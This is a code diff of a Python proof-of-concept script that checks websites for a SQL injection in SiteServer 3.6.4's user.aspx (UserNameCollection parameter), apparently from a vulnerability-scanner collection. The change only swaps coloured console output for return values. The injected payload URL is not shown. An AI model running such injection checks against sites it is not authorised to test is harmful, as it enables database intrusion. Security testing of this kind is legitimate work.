@@ -8,8 +8,8 @@ description: 文件/usercenter/platform/user.aspx中,参数UserNameCollection存
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class siteserver_UserNameCollection_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class siteserver_UserNameCollection_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在siteserver3.6.4 user.aspx注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在siteserver3.6.4 user.aspx注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = siteserver_UserNameCollection_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
